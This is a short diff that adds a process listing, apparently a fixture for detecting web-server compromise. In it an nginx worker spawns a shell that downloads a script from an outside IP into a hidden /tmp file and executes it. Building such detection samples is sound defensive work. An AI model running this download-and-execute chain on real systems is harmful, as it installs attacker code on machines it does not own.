@@ -1,0 +1,5 @@
+ PID  PPID USER     COMMAND         COMMAND
+2222     1 www-data nginx           nginx: worker process
+3333  2222 www-data sh              /bin/sh -c wget http://45.77.1.2/x.sh -O /tmp/.x
+3334  3333 www-data wget            wget http://45.77.1.2/x.sh -O /tmp/.x
+3335  3333 www-data sh              /tmp/.x
